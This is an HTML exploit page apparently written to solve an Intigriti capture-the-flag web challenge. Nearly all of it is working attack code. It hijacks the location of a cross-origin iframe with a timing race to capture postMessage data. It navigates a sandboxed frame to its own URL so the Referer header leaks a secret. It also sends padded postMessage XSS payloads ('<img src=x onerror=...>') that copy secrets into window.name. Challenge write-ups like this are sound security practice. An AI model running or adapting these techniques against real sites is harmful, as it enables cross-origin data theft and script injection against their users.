<!DOCTYPE html>
<html>
<head>
    <title>Infinity Gauntlet: Final</title>
</head>
<body>
    <h1>Protocol v6: The Referer Leak</h1>
    <p>1. Open Developer Tools (F12) -> <b>Network Tab</b>.</p>
    <p>2. Click Launch. Watch for a request to <code>/?LEAK_TIME_STONE</code>.</p>
    <button id="btn" style="font-size:20px; padding:20px; background:#d00; color:white;">LAUNCH EXPLOIT</button>
    
    <h3>Gauntlet Status:</h3>
    <pre id="log" style="background:#eee; padding:10px; min-height:100px;">Waiting...</pre>

    <script>
        let targetWin = null;
        let stones = {};
        
        // Point to your listener file
        const LISTENER_URL = location.href.substring(0, location.href.lastIndexOf('/')) + '/listener.html';
        const LEAK_URL = location.href.substring(0, location.href.lastIndexOf('/')) + '/?LEAK_TIME_STONE';

        function log(msg) {
            document.getElementById('log').innerText = msg + "\n" + document.getElementById('log').innerText;
        }

        document.getElementById('btn').addEventListener('click', () => {
            targetWin = window.open('https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced', 'target');
            log("Target launched...");
            
            // 1. SPACE STONE HIJACK (Immediate Race Condition)
            // We force Frame 3 to load our listener instead of the challenge page.
            // This captures the parent's postMessage.
            let hijacker = setInterval(() => {
                try { targetWin.frames[3].location = LISTENER_URL; } catch(e) {}
            }, 10);
            setTimeout(() => clearInterval(hijacker), 1500);

            // 2. TIME STONE LEAK (Referer Leak)
            // We cannot script the Time Stone (Sandbox), but we CAN navigate it!
            // We navigate it to our server. The 'Referer' header will contain the secret URL.
            setTimeout(() => {
                try { 
                    log("Redirecting Time Stone to capture Referer...");
                    targetWin.frames[4].location = LEAK_URL; 
                } catch(e) {}
            }, 1000);

            // 3. REGEX EXPLOIT LOOP (Power, Reality, Soul, Mind)
            setInterval(collectStones, 500);
        });

        function collectStones() {
            if(!targetWin) return;

            // CHECK SPACE STONE (Index 3)
            try {
                let spaceName = targetWin.frames[3].name;
                if(spaceName && spaceName.startsWith("SPACE_CAPTURED:") && !stones[3]) {
                    stones[3] = spaceName.split(':')[1];
                    log(`[+] Space Stone: ${stones[3]}`);
                }
            } catch(e) {}

            // EXPLOIT OTHER STONES (0, 1, 2, 5)
            [0, 1, 2, 5].forEach(i => {
                if(stones[i]) return;
                try {
                    let f = targetWin.frames[i];
                    // PRIMER
                    f.postMessage("A".repeat(2500) + "<", '*');
                    
                    // PAYLOAD (Fixed Syntax: Single quotes inside double quotes)
                    // We execute JS to read the URL and set window.name
                    let script = "var m=location.search.match(/=[a-f0-9]{8}/); if(m) window.name='STONE:'+m[0].substring(1);";
                    f.postMessage(`<img src=x onerror="${script}">`, '*');
                    
                    // COLLECT
                    let data = f.name;
                    if(data && data.startsWith('STONE:')) {
                        stones[i] = data.split(':')[1];
                        log(`[+] Stone ${i}: ${stones[i]}`);
                    }
                } catch(e) {}
            });

            checkWin();
        }

        function checkWin() {
            // We can automate the alert if we have 5 stones + user provides the 6th
            if (Object.keys(stones).length >= 5) {
                // We have everything except Time Stone (which is in your Network Tab)
                log("------------------------------------------------");
                log("SUCCESS! 5 Stones Captured.");
                log("CHECK YOUR NETWORK TAB for '/?LEAK_TIME_STONE'");
                log("The 'Referer' header of that request has the missing code.");
                log("------------------------------------------------");
                
                // Construct partial code to help you
                let code = 
                    (stones[0]||"????????") + 
                    (stones[5]||"????????") + 
                    (stones[1]||"????????") + 
                    (stones[3]||"????????") + 
                    (stones[2]||"????????") + 
                    "TIME_STONE"; // Placeholder
                
                log("Partial Code: " + code);
                log("Replace TIME_STONE with the code from Network Tab.");
                log("Run this in Console: targetWin.postMessage('FULL_CODE' + 'alert(document.domain)', '*')");
            }
        }
    </script>
</body>
</html>
